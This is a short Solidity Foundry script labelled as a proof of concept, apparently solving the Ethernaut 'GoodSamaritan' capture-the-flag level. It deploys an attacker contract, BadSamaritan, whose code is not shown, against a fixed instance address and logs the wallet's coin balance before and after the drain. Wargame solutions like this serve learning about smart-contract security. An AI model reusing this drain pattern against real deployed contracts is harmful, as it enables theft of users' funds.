// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/GoodSamaritan.sol";
import "../src/BadSamaritan.sol";

contract POC is Script {

    GoodSamaritan goodSamaritan = GoodSamaritan(0x1eE34E34D7e12882101186bBDd3767849994946B);

    function run() external{
        vm.startBroadcast();
        Coin coin = Coin(goodSamaritan.coin());

        console.log('before balance', coin.balances(address(goodSamaritan.wallet())));

        BadSamaritan badSamaritan = new BadSamaritan(address(goodSamaritan));
        badSamaritan.attax();

        console.log('after balance', coin.balances(address(goodSamaritan.wallet())));
        
        vm.stopBroadcast();
    }
}


